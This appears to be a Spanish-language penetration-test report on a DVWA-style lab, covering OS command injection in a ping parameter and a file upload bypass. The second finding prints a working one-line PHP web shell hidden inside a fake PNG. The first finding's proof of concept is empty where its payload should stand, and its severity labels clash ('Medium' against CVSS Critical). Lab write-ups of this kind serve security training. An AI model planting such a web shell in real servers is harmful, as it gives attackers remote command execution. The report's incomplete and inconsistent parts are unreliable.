### V-01 — OS Command Injection (Medium)

**Clasificación:**  
- **OWASP Top 10:** A03:2021 – Injection  
- **OWASP WSTG:** WSTG-INPV-12 (Testing for OS Command Injection)  
- **CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command  
- **CVSS v3.1:** 9.8 (Critical)  
- **Vector:** AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H  

---

#### 📍 Ubicación
- **Módulo afectado:** Command Injection  
- **URL:** `http://192.168.56.1/vulnerabilities/exec/`  
- **Parámetro vulnerable:** `ip`  
- **Método:** GET  

---

#### 🛠️ Descripción técnica  
La aplicación concatena directamente la entrada del usuario al comando del sistema utilizado para ejecutar `ping`.  
Debido a la falta de sanitización, es posible inyectar operadores de shell (`;`, `|`, `&&`) y ejecutar comandos arbitrarios en el sistema operativo subyacente.

Esto constituye una vulnerabilidad de **Remote Command Execution (RCE)**.

---

#### ⚡ Prueba de Concepto (PoC)
**Payload enviado:**


## V-02 — File Upload Bypass (Medium)

### 🔐 Clasificación
- **OWASP Top 10:** A08:2021 – Software and Data Integrity Failures  
- **OWASP WSTG:** WSTG-INPV-08 (Testing for File Upload)  
- **CWE:** CWE-434 — Unrestricted File Upload  
- **CVSS v3.1:** 7.5 (High)  
- **Vector:** AV:N / AC:L / PR:L / UI:N / S:U / C:H / I:H / A:N  

---

### 📍 Ubicación
- **Módulo afectado:** File Upload  
- **URL:** `http://192.168.56.1/vulnerabilities/upload/`  
- **Directorio destino:** `/hackable/uploads/`  

---

### 🛠 Descripción técnica
El módulo permite cargar archivos sin validar correctamente el contenido real.  
Aunque comprueba la extensión y un encabezado básico, **no analiza el contenido binario**, permitiendo subir archivos manipulados.

Esto habilita a un atacante a subir archivos que parecen seguros (como una imagen PNG), pero que realmente contienen código malicioso que podría ejecutarse si se combina con otra vulnerabilidad (por ejemplo, LFI).

---

### ⚡ Prueba de Concepto (PoC)

#### 1) Creación del archivo malicioso

Se generó un archivo con nombre `archivo_malicioso.png` que contiene un payload PHP dentro de un contenedor PNG falso.

**Payload incluido en el archivo:**
```php
<?php echo "<pre>"; system($_GET['cmd']); echo "</pre>"; ?>
```
![Archivo Malisioso](/evidencias/screenshots/archivo_malisioso.png)